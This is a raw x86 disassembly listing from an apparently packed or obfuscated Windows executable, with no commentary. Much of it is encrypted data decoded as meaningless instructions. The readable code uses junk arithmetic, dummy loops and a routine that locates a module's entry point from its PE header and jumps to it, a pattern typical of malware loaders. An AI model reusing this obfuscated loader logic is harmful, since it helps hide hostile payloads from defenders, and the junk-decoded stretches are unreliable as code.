  4060fe:	sbb    eax,0x5ff2a7cf
  406103:	test   DWORD PTR [eax],esp
  406105:	inc    edx
  406106:	inc    edi
  406107:	mov    ebp,0x56223817
  40610c:	xchg   edx,eax
  40610d:	cli    
  40610e:	or     ebp,DWORD PTR [ebx+0x52]
  406111:	add    edx,DWORD PTR [edi-0x1b]
  406114:	(bad)  
  406115:	push   es
  406116:	mov    al,0xf0
  406118:	fsub   DWORD PTR [edx]
  40611a:	jne    0x4060b5
  40611c:	outs   dx,BYTE PTR ds:[esi]
  40611d:	rol    BYTE PTR [edx+0x17],cl
  406120:	aas    
  406121:	leave  
  406122:	retf   
  406123:	aaa    
  406124:	xchg   esp,eax
  406125:	test   eax,0x276d8b4
  40612a:	cmp    al,0xbf
  40612c:	mov    ds:0x664967db,al
  406131:	xor    edx,ebp
  406133:	test   al,0x47
  406135:	inc    edx
  406136:	stos   BYTE PTR es:[edi],al
  406137:	clc    
  406138:	(bad)  
  406139:	xchg   esi,eax
  40613a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40613b:	jp     0x406170
  40613d:	(bad)  
  40613e:	pop    ds
  40613f:	in     eax,dx
  406140:	jb     0x4060ec
  406142:	dec    ebp
  406143:	jnp    0x406119
  406145:	adc    al,0x43
  406147:	or     ecx,DWORD PTR [esi+0x50]
  40614a:	shl    esp,cl
  40614c:	mov    edi,0xf2bc54da
  406151:	or     DWORD PTR [eax-0x53],esi
  406154:	jb     0x4060e6
  406156:	sub    eax,0x57f50358
  40615b:	mov    cl,0x3b
  40615d:	hlt    
  40615e:	mov    edi,0x78f627b
  406163:	xchg   edi,eax
  406164:	jle    0x40617f
  406166:	adc    ecx,esp
  406168:	imul   esi,DWORD PTR [eax],0x60
  40616b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40616c:	(bad)  
  40616d:	loop   0x4061d8
  40616f:	jge    0x4061b8
  406171:	add    eax,0x70d1c840
  406176:	xchg   esp,eax
  406177:	mov    edx,0x1ac7bc08
  40617c:	cli    
  40617d:	retf   0xefac
  406180:	sbb    edx,edx
  406182:	ins    BYTE PTR es:[edi],dx
  406183:	es (bad) 
  406185:	adc    DWORD PTR [ecx+0xc2a0f40],esp
  40618b:	mov    eax,DWORD PTR [edi-0x2f17579d]
  406191:	push   ss
  406192:	nop
  406193:	xchg   edi,eax
  406194:	xchg   esi,eax
  406195:	dec    edx
  406196:	adc    ecx,DWORD PTR [ebx+0x2de1c40e]
  40619c:	xchg   edx,eax
  40619d:	mov    ebp,0x6cfbe4e3
  4061a2:	add    al,0xf3
  4061a4:	clc    
  4061a5:	and    dl,BYTE PTR [eax+0x5f243790]
  4061ab:	cwde   
  4061ac:	fbstp  TBYTE PTR [edx-0x23]
  4061af:	ret    
  4061b0:	dec    eax
  4061b1:	mov    ch,0xfe
  4061b3:	cmp    esi,esi
  4061b5:	xchg   ecx,eax
  4061b6:	ins    DWORD PTR es:[edi],dx
  4061b7:	push   es
  4061b8:	dec    edi
  4061b9:	js     0x406224
  4061bb:	adc    ebp,esp
  4061bd:	adc    BYTE PTR [esi],ah
  4061bf:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4061c1:	fist   WORD PTR [eax-0x6f2f4fb]
  4061c7:	repnz shl DWORD PTR ds:0x1f7dd0e2,1
  4061ce:	leave  
  4061cf:	add    BYTE PTR [edi],bl
  4061d1:	adc    bl,ch
  4061d3:	pop    ecx
  4061d4:	outs   dx,BYTE PTR ds:[esi]
  4061d5:	add    DWORD PTR [ecx+0x26f6823b],esi
  4061db:	jmp    0x40623a
  4061dd:	das    
  4061de:	push   eax
  4061df:	mov    bh,0xe6
  4061e1:	ret    
  4061e2:	adc    ecx,ebp
  4061e4:	iret   
  4061e5:	xor    esp,0xffffffc8
  4061e8:	call   0xebe5:0x47dc9ce
  4061ef:	xor    BYTE PTR [esi-0x6a],dl
  4061f2:	jnp    0x406268
  4061f4:	mov    ecx,0xfb6962d0
  4061f9:	mov    dl,0x89
  4061fb:	hlt    
  4061fc:	xchg   ebp,eax
  4061fd:	loop   0x406273
  4061ff:	jle    0x40627a
  406201:	arpl   dx,cx
  406203:	jmp    0x6396:0xfbeffa93
  40620a:	psllq  mm1,QWORD PTR [eax]
  40620d:	repz pop esp
  40620f:	ja     0x4061ff
  406211:	pop    edi
  406212:	xor    ch,BYTE PTR [esi+0xa5bdb34]
  406218:	or     ch,bl
  40621a:	jmp    DWORD PTR [ebx]
  40621c:	inc    ecx
  40621d:	and    eax,0xad7ed7ed
  406222:	lahf   
  406223:	pop    ebp
  406224:	mov    esi,0xe8176bcd
  406229:	xchg   ecx,eax
  40622a:	cs xor cl,0x7
  40622e:	ret    
  40622f:	(bad)  
  406230:	(bad)  
  406232:	adc    ch,BYTE PTR [edi-0x3b]
  406235:	inc    esi
  406236:	loope  0x4061cf
  406238:	sub    BYTE PTR [edx+0x6cdb6529],bh
  40623e:	inc    eax
  40623f:	stos   DWORD PTR es:[edi],eax
  406240:	add    ecx,DWORD PTR [ecx+0x5da20f89]
  406246:	retf   0x85f0
  406249:	push   edi
  40624a:	pop    ss
  40624b:	ins    DWORD PTR es:[edi],dx
  40624c:	inc    eax
  40624d:	inc    edi
  40624e:	mov    ebp,0xa9feb9ed
  406253:	pusha  
  406254:	fisttp QWORD PTR [ebp+edi*4-0x464c0646]
  40625b:	fwait
  40625c:	jb     0x4062a7
  40625e:	inc    eax
  40625f:	ret    0xab3a
  406262:	inc    ecx
  406263:	jno    0x406298
  406265:	lock and DWORD PTR ds:0x4338a3,0x0
  406270:	jmp    0x406282
  406275:	mov    ecx,DWORD PTR ds:0x4338a3
  40627b:	inc    ecx
  40627c:	mov    DWORD PTR ds:0x4338a3,ecx
  406282:	cmp    DWORD PTR ds:0x4338a3,0x1d
  406289:	jae    0x4062c6
  40628f:	cmp    DWORD PTR ds:0x4338a3,0xb
  406296:	jne    0x4062a7
  40629c:	push   0x3d1a
  4062a1:	call   DWORD PTR ds:0x4120c8
  4062a7:	cmp    DWORD PTR ds:0x4338a3,0xa
  4062ae:	jne    0x4062c1
  4062b4:	mov    ecx,DWORD PTR ds:0x4338a3
  4062ba:	inc    ecx
  4062bb:	mov    DWORD PTR ds:0x4338a3,ecx
  4062c1:	jmp    0x406275
  4062c6:	mov    eax,DWORD PTR [edx+0x194]
  4062cc:	mov    ecx,DWORD PTR [eax]
  4062ce:	mov    eax,DWORD PTR [ecx+0x3c]
  4062d1:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4062d5:	add    eax,ecx
  4062d7:	mov    DWORD PTR [ebp+0x8],esi
  4062da:	mov    DWORD PTR [ebp+0x10],eax
  4062dd:	mov    eax,DWORD PTR [ebp+0x10]
  4062e0:	pop    esi
  4062e1:	test   eax,eax
  4062e3:	je     0x406656
  4062e9:	push   DWORD PTR ds:0x413c0c
  4062ef:	push   DWORD PTR ds:0x4139b8
  4062f5:	mov    eax,DWORD PTR [edx+0x194]
  4062fb:	push   DWORD PTR [eax]
  4062fd:	mov    eax,DWORD PTR [ebp+0x10]
  406300:	jmp    0x40664f
  406305:	lahf   
  406306:	cmp    al,0x1a
  406308:	push   ds
  406309:	pop    ecx
  40630a:	fcomp  DWORD PTR [ebx-0x2e0ee343]
  406310:	cmc    
  406311:	leave  
  406312:	xchg   esi,eax
  406313:	or     BYTE PTR [esp+edx*2+0x2c7e7e3f],al
  40631a:	jge    0x40639a
  40631c:	jle    0x406378
  40631e:	mov    DWORD PTR [edi+0x74acc350],edi
  406324:	ret    
  406325:	test   esi,ecx
  406327:	inc    eax
  406328:	mov    dl,0x4e
  40632a:	inc    esp
  40632b:	jle    0x40639a
  40632d:	shl    bh,cl
  40632f:	popa   
  406330:	mov    ebx,0x21dbfa83
  406335:	loopne 0x4062f0
  406337:	adc    eax,0x34c34eba
  40633c:	push   edx
  40633d:	or     ebp,DWORD PTR [ebp+0xa128a3e]
  406343:	xor    ebp,ebp
  406345:	xchg   DWORD PTR [esi+0x6b],ecx
  406348:	push   0x7a
  40634a:	jmp    0x40633f
  40634c:	popa   
  40634d:	add    al,0x90
  40634f:	inc    ebx
  406350:	(bad)  
  406351:	xchg   BYTE PTR [esi+0xa],ah
  406354:	mov    esp,0x2d208c33
  406359:	mov    al,0x2f
  40635b:	xchg   edx,eax
  40635c:	lahf   
  40635d:	dec    ecx
  40635e:	outs   dx,DWORD PTR gs:[esi]
  406360:	push   ds
  406361:	jmp    0x67193ca9
  406366:	cmp    eax,0xfffcaa87
  40636b:	leave  
  40636c:	sti    
  40636d:	mov    esi,?
  40636f:	adc    DWORD PTR [ebx-0xe],ebp
  406372:	leave  
  406373:	mov    bh,0xf1
  406375:	rcr    DWORD PTR [edi],cl
  406377:	ja     0x4063a2
  406379:	aaa    
  40637a:	or     DWORD PTR [eax+0x5c992619],edx
  406380:	mov    bl,0x2c
  406382:	jmp    0x4063bb
  406384:	dec    edx
  406385:	scas   al,BYTE PTR es:[edi]
  406386:	mov    ds:0x7b116a0a,eax
  40638b:	ror    DWORD PTR [esi-0x3e8a5afc],cl
  406391:	shr    BYTE PTR [edx+0x8],cl
  406394:	xchg   edx,eax
  406395:	inc    ebp
  406396:	stc    
  406397:	jle    0x406403
  406399:	int    0xa4
  40639b:	fld    QWORD PTR [edi+0x0]
  40639e:	push   DWORD PTR [edx-0x57]
  4063a1:	cmp    eax,0x7c9124e5
  4063a6:	inc    ebp
  4063a7:	dec    eax
  4063a8:	adc    edi,eax
  4063aa:	pop    ds
  4063ab:	test   eax,0x9b4d4737
  4063b0:	mov    al,0xc4
  4063b2:	cmp    BYTE PTR [edi],ah
  4063b4:	mov    ch,0xb4
  4063b6:	jnp    0x40638b
  4063b8:	(bad)  
  4063b9:	aad    0x36
  4063bb:	dec    ecx
  4063bc:	stos   BYTE PTR es:[edi],al
  4063bd:	daa    
  4063be:	shl    DWORD PTR [ebx-0x5dbe2c9a],0xbf
  4063c5:	mov    bl,0xd3
  4063c7:	pop    edi
  4063c8:	fwait
  4063c9:	dec    ebp
  4063ca:	inc    ebx
  4063cb:	ins    DWORD PTR es:[edi],dx
  4063cc:	lahf   
  4063cd:	push   ebx
  4063ce:	and    dl,dl
  4063d0:	push   esi
  4063d1:	mov    WORD PTR [edi+esi*2-0x3c],es
  4063d5:	sar    BYTE PTR [ecx],cl
  4063d7:	or     BYTE PTR [edi+0x64],0x85
  4063db:	push   ecx
  4063dc:	mov    ds:0x4aae5131,al
  4063e1:	sub    al,BYTE PTR [ebx-0x55]
  4063e4:	pop    ecx
  4063e5:	clc    
  4063e6:	jmp    DWORD PTR [esi-0x19]
  4063e9:	xor    al,0x48
  4063eb:	and    DWORD PTR [ecx+0x430e1c27],esi
  4063f1:	repz sub esi,ecx
  4063f4:	push   ds
  4063f5:	xor    eax,0x76b0eb5e
  4063fa:	test   al,0x74
  4063fc:	fsubr  QWORD PTR [ecx+0x73192d9]
  406402:	and    dl,BYTE PTR [ecx+0x18]
  406405:	push   ss
  406406:	xchg   edi,eax
  406407:	fs mov ebx,0xa0171671
  40640d:	adc    cl,BYTE PTR [esi-0x16f8160f]
  406413:	mov    ch,ah
  406415:	pop    esp
  406416:	cmp    DWORD PTR ds:0xd9b6ca71,esi
  40641c:	jmp    0xb8d0a75a
  406421:	shl    BYTE PTR [ebp-0x73],1
  406424:	daa    
  406425:	ss jne 0x4063d9
  406428:	or     dh,BYTE PTR [edx-0x6b]
  40642b:	push   ss
  40642c:	mov    ebp,0xa2dc4a6
  406431:	xor    eax,0x1dd1de05
  406436:	cmc    
  406437:	sub    DWORD PTR [esp+edi*1+0x6ff245e1],ecx
  40643e:	jb     0x4063e8
  406440:	push   edi
  406441:	push   edi
  406442:	(bad)  
  406444:	rcr    ecx,cl
  406446:	aaa    
  406447:	mov    bh,0x87
  406449:	add    al,0xb5
  40644b:	cmovg  ebx,DWORD PTR [eax+0x21]
  40644f:	ins    BYTE PTR es:[edi],dx
  406450:	mov    ch,0xad
  406452:	xchg   ecx,eax
  406453:	out    dx,al
  406454:	sub    BYTE PTR [ebp-0x3f],bh
  406457:	(bad)  
  406458:	(bad)  
  406459:	aad    0x35
  40645b:	push   esi
  40645c:	psllw  xmm7,XMMWORD PTR [ecx-0x4c]
  406461:	xor    ch,bl
  406463:	push   esi
  406464:	jp     0x406494
  406466:	cs dec esi
  406468:	xchg   ebx,eax
  406469:	sti    
  40646a:	push   0x42
  40646c:	fwait
  40646d:	dec    ebp
  40646e:	inc    ebx
  40646f:	mov    bl,ah
  406471:	inc    esp
  406472:	sahf   
  406473:	pop    ecx
  406474:	hlt    
  406475:	repz sub BYTE PTR [ebp-0x41],cl
  406479:	mov    al,ds:0x96ac98cb
  40647e:	and    bh,bh
  406480:	push   ebp
  406481:	fs shl DWORD PTR cs:[ecx],1
  406485:	mov    eax,0x217a0c75
  40648a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40648b:	out    dx,al
  40648c:	je     0x4064e9
  40648e:	(bad)  
  40648f:	or     DWORD PTR [edx+0x7bf57be6],eax
  406495:	mov    bh,0x56
  406497:	push   cs
  406498:	lock push 0xf3472f37
  40649e:	and    DWORD PTR [esi+0x5d4b03c3],eax
  4064a4:	stos   BYTE PTR es:[edi],al
  4064a5:	shl    dl,0xb5
  4064a8:	test   DWORD PTR [esi],ecx
  4064aa:	pop    es
  4064ab:	cmp    al,0xf8
  4064ad:	fst    st(4)
  4064af:	out    0xc8,eax
  4064b1:	dec    eax
  4064b2:	hlt    
  4064b3:	or     al,0x39
  4064b5:	ins    BYTE PTR es:[edi],dx
  4064b6:	nop
  4064b7:	pop    esp
  4064b8:	pop    ecx
  4064b9:	or     dl,BYTE PTR [ebx+0x4a]
  4064bc:	pop    edi
  4064bd:	add    dh,ch
  4064bf:	mov    ecx,0xae134695
  4064c4:	mov    al,ds:0x1390f6d4
  4064c9:	mov    ds:0xa9da07fc,al
  4064ce:	sbb    DWORD PTR [ecx-0x137201d0],ebp
  4064d4:	jno    0x40653a
  4064d6:	addr16 icebp 
  4064d8:	or     eax,0x463e2af3
  4064dd:	stc    
  4064de:	sar    DWORD PTR [eax-0x4e11b71b],0xfd
  4064e5:	hlt    
  4064e6:	mov    ebx,0x5d811b49
  4064eb:	mov    edi,0xffe5c0fd
  4064f0:	cdq    
  4064f1:	pushf  
  4064f2:	xchg   ecx,edx
  4064f4:	xor    bh,BYTE PTR [esi+0x370b8fff]
  4064fa:	sbb    DWORD PTR ds:0x17b5a20a,eax
  406500:	mov    esi,0x9d4b9e9e
  406505:	sahf   
  406506:	stos   DWORD PTR es:[edi],eax
  406507:	sbb    al,0xb0
  406509:	retf   
  40650a:	push   0x15e97e38
  40650f:	add    al,0x42
  406511:	jne    0x406498
  406513:	mov    edx,0x1adcd203
  406518:	inc    ebp
  406519:	sbb    BYTE PTR [esi],0x2f
  40651c:	or     BYTE PTR [edx],ah
  40651e:	and    edx,DWORD PTR [edi-0xd50a3a4]
  406524:	retf   
  406525:	mov    BYTE PTR [ecx+0x6c],bh
  406528:	mov    cs,WORD PTR [eax+0x3f]
  40652b:	mov    esp,0x14cb063c
  406530:	icebp  
  406531:	mov    esp,0xc459ff6
  406536:	or     bh,0x17
  406539:	xchg   edx,eax
  40653a:	sbb    al,bh
  40653c:	ja     0x40651c
  40653e:	out    0xe,eax
  406540:	dec    edx
  406541:	in     eax,0x90
  406543:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406544:	sbb    al,0xca
  406546:	pushf  
  406547:	in     eax,0xa4
  406549:	or     al,0x2d
  40654b:	ins    BYTE PTR es:[edi],dx
  40654c:	push   ebx
  40654d:	mov    eax,0x9eff4621
  406552:	sub    DWORD PTR [esi+edx*8],0xc8c53ecb
  406559:	daa    
  40655a:	cmp    bh,dh
  40655c:	xor    al,0x26
  40655e:	mov    esp,0x58cac3e4
  406563:	or     esi,DWORD PTR [edx+0x40]
  406566:	sub    BYTE PTR [edx+0x5973bbc2],ch
  40656c:	int3   
  40656d:	sar    dl,0x57
  406570:	mov    eax,esp
  406572:	cmp    cl,BYTE PTR [edi-0x163ac94]
  406578:	lods   eax,DWORD PTR ds:[esi]
  406579:	sbb    al,0x5c
  40657b:	and    al,0xbf
  40657d:	ror    DWORD PTR [edi-0x20d27599],1
  406583:	shr    DWORD PTR ds:0x8943e985,1
  406589:	mov    eax,edx
  40658b:	mov    dl,0x31
  40658d:	add    eax,0xf441a323
  406592:	lods   al,BYTE PTR ds:[esi]
  406593:	xchg   edx,eax
  406594:	add    al,0x8f
  406596:	mov    ecx,0x24ccadbf
  40659b:	sub    BYTE PTR [ebp-0x43e79756],dh
  4065a1:	or     esp,DWORD PTR ds:0xe6a1761f
  4065a7:	mov    al,0x97
  4065a9:	adc    dl,dh
  4065ab:	loop   0x406549
  4065ad:	push   eax
  4065ae:	xchg   BYTE PTR [edi],dl
  4065b0:	and    ch,BYTE PTR [esi+eax*2]
  4065b3:	test   DWORD PTR [ebx-0x123256e8],esi
  4065b9:	mov    bl,BYTE PTR [ebp+0x5745a0c7]
  4065bf:	push   ecx
  4065c0:	inc    esi
  4065c1:	dec    edx
  4065c2:	rol    DWORD PTR [ebx],1
  4065c4:	rcl    BYTE PTR [ebx-0x5b],1
  4065c7:	add    ebx,DWORD PTR [ebx+0x40]
  4065ca:	imul   edx,ebx,0x33753647
  4065d0:	stos   DWORD PTR es:[edi],eax
  4065d1:	push   es
  4065d2:	xchg   ebx,eax
  4065d3:	sbb    DWORD PTR [esi+0x37],eax
  4065d6:	lds    ebp,FWORD PTR [esi-0x23]
  4065d9:	and    BYTE PTR [eax-0x61],dl
  4065dc:	aam    0x73
  4065de:	cmp    eax,esp
  4065e0:	jp     0x4065e9
  4065e2:	push   cs
  4065e3:	out    0x73,al
  4065e5:	in     eax,dx
  4065e6:	fadd   st,st(6)
  4065e8:	retf   0xec3a
  4065eb:	out    0x73,eax
  4065ed:	out    dx,al
  4065ee:	rcr    DWORD PTR [ecx],0x78
  4065f1:	xlat   BYTE PTR ds:[ebx]
  4065f2:	enter  0xcb7c,0xb4
  4065f6:	mov    bl,0x11
  4065f8:	pop    edi
  4065f9:	mov    cl,0x20
  4065fb:	sub    bh,ah
  4065fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4065fe:	ficom  WORD PTR [ebp-0x59f82059]
  406604:	jmp    0x40663a
  406606:	dec    eax
  406607:	adc    BYTE PTR [si+0x1a],ch
  40660b:	(bad)  
  40660c:	adc    al,0x69
  40660e:	ret    0xbbf8
  406611:	repnz inc esi
  406613:	pop    edx
  406614:	jno    0x40668a
  406616:	dec    esi
  406617:	cwde   
  406618:	push   es
  406619:	inc    esi
  40661a:	and    cl,dh
  40661c:	out    0xab,eax
  40661e:	outs   dx,DWORD PTR ds:[esi]
  40661f:	dec    ebp
  406620:	mov    bh,0x96
  406622:	scas   eax,DWORD PTR es:[edi]
  406623:	sbb    BYTE PTR [edx],bl
  406625:	xchg   BYTE PTR [edi+0x68],ch
  406628:	out    dx,eax
  406629:	mov    cl,0xb0
  40662b:	jmp    0xf0f3:0xebf93b5b
  406632:	mov    ebp,0x212cc968
  406637:	and    ebp,DWORD PTR [eax]
  406639:	sub    eax,0xbe1daa85
  40663e:	jp     0x406650
  406640:	test   BYTE PTR [ebx],al
  406642:	mov    DWORD PTR ds:0x73776e71,ebx
  406648:	jmp    0x406677
  40664a:	mov    ecx,0x96480d74
  40664f:	call   eax
  406651:	jmp    0x406659
  406656:	mov    eax,DWORD PTR [ebp+0x10]
  406659:	leave  
  40665a:	ret    0xc
  40665d:	push   ebp
  40665e:	mov    ebp,esp
  406660:	sub    esp,0x28
  406663:	push   0x413cb4
  406668:	call   DWORD PTR ds:0x412408
  40666e:	mov    DWORD PTR ds:0x43377b,0x6571
  406678:	cmp    WORD PTR [eax],0x0
  40667c:	jne    0x406afe
  406682:	push   0x413d04
  406687:	call   DWORD PTR ds:0x412404
  40668d:	mov    DWORD PTR ds:0x433853,0x5ed5
  406697:	cmp    BYTE PTR [eax],0x0
  40669a:	mov    DWORD PTR ds:0x433827,0x18c3
  4066a4:	jne    0x406b09
  4066aa:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  4066b1:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  4066b8:	lea    eax,[ebp-0x20]
  4066bb:	mov    DWORD PTR [ebp-0x14],eax
  4066be:	lea    eax,[ebp-0x1c]
  4066c1:	and    DWORD PTR ds:0x433863,0x0
  4066cb:	mov    ecx,DWORD PTR ds:0x433863
  4066d1:	inc    ecx
  4066d2:	mov    DWORD PTR ds:0x433863,ecx
  4066d8:	cmp    DWORD PTR ds:0x433863,0x5
  4066df:	jne    0x4066f8
  4066e5:	push   0x2ad8
  4066ea:	push   DWORD PTR [ebp-0x1c]
  4066ed:	push   0x433983
  4066f2:	call   DWORD PTR ds:0x412340
  4066f8:	cmp    DWORD PTR ds:0x433863,0x4
  4066ff:	jne    0x406714
  406705:	xor    ecx,ecx
  406707:	or     ecx,DWORD PTR ds:0x433863
  40670d:	inc    ecx
  40670e:	mov    DWORD PTR ds:0x433863,ecx
  406714:	cmp    DWORD PTR ds:0x433863,0x1f
  40671b:	jb     0x4066cb
  406721:	movzx  ecx,WORD PTR ds:0x433857
  406728:	and    ecx,DWORD PTR ds:0x43378f
  40672e:	mov    DWORD PTR ds:0x433857,ecx
  406734:	mov    DWORD PTR [ebp-0x10],eax
  406737:	adc    DWORD PTR ds:0x43379b,ecx
  40673d:	mov    eax,ds:0x413b34
  406742:	sbb    ecx,DWORD PTR ds:0x4338ab
  406748:	mov    eax,DWORD PTR [eax+0x1c8]
  40674e:	mov    eax,DWORD PTR [eax]
  406750:	sub    DWORD PTR ds:0x433793,ebx
  406756:	mov    ecx,DWORD PTR [ebp-0x10]
  406759:	push   ebx
  40675a:	xor    DWORD PTR ds:0x4337eb,edx
  406760:	push   esi
  406761:	and    DWORD PTR ds:0x433787,0x0
  40676b:	jmp    0x40677d
  406770:	mov    ebx,DWORD PTR ds:0x433787
  406776:	inc    ebx
  406777:	mov    DWORD PTR ds:0x433787,ebx
  40677d:	cmp    DWORD PTR ds:0x433787,0x1b
  406784:	jae    0x4067ac
  40678a:	cmp    DWORD PTR ds:0x433787,0x23
  406791:	jne    0x4067a7
  406797:	push   0x4339b3
  40679c:	push   DWORD PTR [ebp-0x18]
  40679f:	push   0x0
  4067a1:	call   DWORD PTR ds:0x412344
  4067a7:	jmp    0x406770
  4067ac:	mov    esi,0x7510854
  4067b1:	sub    DWORD PTR ds:0x43382b,0x6a10
  4067bb:	xor    eax,esi
  4067bd:	adc    DWORD PTR ds:0x433817,0x433827
  4067c7:	push   edi
  4067c8:	mov    edi,0x32729b
  4067cd:	add    eax,edi
  4067cf:	mov    ebx,0x337e
  4067d4:	mov    DWORD PTR [ecx],eax
  4067d6:	mov    eax,ds:0x413e08
  4067db:	cmp    eax,0x23c13046
  4067e0:	mov    eax,DWORD PTR [ebp-0x4]
  4067e3:	mov    ebx,0xf89c853d
  4067e8:	je     0x406824
  4067ee:	or     ecx,DWORD PTR ds:0x433853
  4067f4:	mov    ecx,DWORD PTR [ebp-0x8]
  4067f7:	sbb    DWORD PTR ds:0x4337eb,0x4ed6
  406801:	xor    eax,esi
  406803:	add    eax,edi
  406805:	sbb    DWORD PTR ds:0x433793,0x43381f
  40680f:	imul   eax,ecx
  406812:	mov    DWORD PTR [ebp-0x8],eax
  406815:	mov    DWORD PTR ds:0x433787,0x49d5
  40681f:	jmp    0x4068d7
  406824:	or     ecx,DWORD PTR ds:0x43382f
  40682a:	xor    eax,esi
  40682c:	and    ecx,0x6df5
  406832:	add    eax,edi
  406834:	xor    ecx,ecx
  406836:	add    ecx,DWORD PTR ds:0x433863
  40683c:	and    DWORD PTR ds:0x433827,ecx
  406842:	mov    ds:0x413c48,eax
  406847:	mov    ecx,DWORD PTR ds:0x4338ab
  40684d:	or     DWORD PTR ds:0x433863,ecx
  406853:	mov    eax,DWORD PTR [ebp-0x8]
  406856:	add    DWORD PTR ds:0x4337db,0x62ed
  406860:	xor    eax,esi
  406862:	and    DWORD PTR ds:0x43389f,ebx
  406868:	add    eax,edi
  40686a:	mov    ecx,DWORD PTR ds:0x43382b
  406870:	sub    DWORD PTR ds:0x433853,ecx
  406876:	mov    ds:0x413e08,eax
  40687b:	sbb    ecx,ecx
  40687d:	mov    eax,DWORD PTR [ebp-0x4]
  406880:	and    DWORD PTR ds:0x43378b,ecx
  406886:	mov    ecx,DWORD PTR ds:0x413c48
  40688c:	sbb    DWORD PTR ds:0x433787,0x486c
  406896:	xor    eax,esi
  406898:	adc    DWORD PTR ds:0x433793,0x6147
  4068a2:	add    eax,edi
  4068a4:	cmp    ecx,eax
  4068a6:	mov    DWORD PTR ds:0x43378f,0x4c28
  4068b0:	jne    0x4068d7
  4068b6:	sub    DWORD PTR ds:0x4337a3,0x4338ab
  4068c0:	push   ebx
  4068c1:	or     DWORD PTR ds:0x43381b,0x43385f
  4068cb:	push   DWORD PTR [ebp-0x4]
  4068ce:	push   DWORD PTR [ebp-0x8]
  4068d1:	call   DWORD PTR ds:0x413c40
  4068d7:	mov    eax,ds:0x413b34
  4068dc:	mov    eax,DWORD PTR [eax+0x18c]
  4068e2:	and    DWORD PTR ds:0x433867,0x433813
  4068ec:	mov    eax,DWORD PTR [eax]
  4068ee:	mov    DWORD PTR [ebp-0x18],eax
  4068f1:	mov    DWORD PTR [ebp-0x10],ebx
  4068f4:	or     DWORD PTR ds:0x4337d3,0x1d95
  4068fe:	mov    DWORD PTR [ebp-0x10],ebx
  406901:	sub    DWORD PTR ds:0x4337db,0x43386f
  40690b:	mov    DWORD PTR [ebp-0x10],ebx
  40690e:	sub    DWORD PTR ds:0x43382b,0x4337ef
  406918:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40691f:	and    DWORD PTR ds:0x4337db,0x43381b
  406929:	mov    DWORD PTR [ebp-0x28],ebx
  40692c:	dec    DWORD PTR ds:0x43377b
  406932:	mov    DWORD PTR [ebp-0x28],0xf89c8539
  406939:	mov    ebx,DWORD PTR [ebp-0x8]
  40693c:	adc    DWORD PTR ds:0x43377b,0x4337a3
  406946:	xor    ebx,esi
  406948:	add    ebx,edi
  40694a:	jmp    0x4069ee
  40694f:	not    DWORD PTR ds:0x43385b
  406955:	mov    eax,DWORD PTR [ebp-0x4]
  406958:	xor    eax,esi
  40695a:	lea    eax,[eax+ebx*1+0x32729b]
  406961:	push   eax
  406962:	mov    eax,DWORD PTR [ebp-0x10]
  406965:	xor    eax,esi
  406967:	lea    eax,[ebp+eax*1+0x3272a3]
  40696e:	push   eax
  40696f:	adc    DWORD PTR ds:0x43377f,0x8003
  406979:	mov    eax,ds:0x413b34
  40697e:	xor    DWORD PTR ds:0x43386f,0x2bd0
  406988:	push   DWORD PTR [eax+0x1bc]
  40698e:	call   0x40f058
  406993:	mov    eax,DWORD PTR [ebp-0x4]
  406996:	add    ecx,0x2fd0
  40699c:	xor    eax,esi
  40699e:	and    DWORD PTR ds:0x43389b,0x0
  4069a8:	mov    ecx,DWORD PTR ds:0x43389b
  4069ae:	inc    ecx
  4069af:	mov    DWORD PTR ds:0x43389b,ecx
  4069b5:	cmp    DWORD PTR ds:0x43389b,0x17
  4069bc:	jne    0x4069c8
  4069c2:	call   DWORD PTR ds:0x4120cc
  4069c8:	cmp    DWORD PTR ds:0x43389b,0x11
  4069cf:	jb     0x4069a8
  4069d5:	mov    ecx,DWORD PTR ds:0x433817
  4069db:	adc    ecx,DWORD PTR ds:0x4337df
  4069e1:	mov    DWORD PTR ds:0x433817,ecx
  4069e7:	lea    ebx,[ebx+eax*1+0x32729b]
  4069ee:	mov    eax,DWORD PTR [ebp-0x4]
  4069f1:	mov    ecx,DWORD PTR [ebp-0x4]
  4069f4:	xor    ecx,esi
  4069f6:	xor    eax,esi
  4069f8:	add    eax,ecx
  4069fa:	mov    ecx,DWORD PTR [ebp-0x4]
  4069fd:	xor    ecx,esi
  4069ff:	lea    eax,[eax+ecx*1+0x9757d1]
  406a06:	cmp    ebx,eax
  406a08:	jbe    0x40694f
  406a0e:	mov    eax,DWORD PTR [ebp+0xc]
  406a11:	mov    ds:0x4139b8,eax
  406a16:	mov    eax,DWORD PTR [ebp+0x10]
  406a19:	mov    ds:0x413c0c,eax
  406a1e:	mov    eax,ds:0x4139b8
  406a23:	mov    ecx,DWORD PTR [ebp-0x14]
  406a26:	push   DWORD PTR [ebp-0x18]
  406a29:	sub    eax,edi
  406a2b:	push   DWORD PTR [ebp-0x1c]
  406a2e:	xor    eax,esi
  406a30:	mov    DWORD PTR [ecx],eax
  406a32:	push   DWORD PTR [ebp-0x20]
  406a35:	call   0x40d59f
  406a3a:	sub    eax,edi
  406a3c:	xor    eax,esi
  406a3e:	mov    DWORD PTR [ebp+0xc],eax
  406a41:	mov    ecx,DWORD PTR [ebp-0x4]
  406a44:	mov    eax,DWORD PTR [ebp+0xc]
  406a47:	xor    ecx,esi
  406a49:	add    ecx,edi
  406a4b:	xor    edx,edx
  406a4d:	div    ecx
  406a4f:	mov    ecx,DWORD PTR [ebp-0x8]
  406a52:	cmp    ecx,eax
  406a54:	jne    0x406a5f
  406a5a:	call   0x401000
  406a5f:	lea    eax,[ebp+0x4]
  406a62:	mov    DWORD PTR [ebp-0x24],eax
  406a65:	mov    eax,ds:0x413b34
  406a6a:	push   0x4
  406a6c:	add    eax,0x1cc
  406a71:	push   eax
  406a72:	lea    eax,[ebp-0xc]
  406a75:	push   eax
  406a76:	call   0x40f058
  406a7b:	mov    eax,DWORD PTR [ebp-0xc]
  406a7e:	mov    eax,DWORD PTR [ebp-0x4]
  406a81:	mov    eax,DWORD PTR [ebp-0x8]
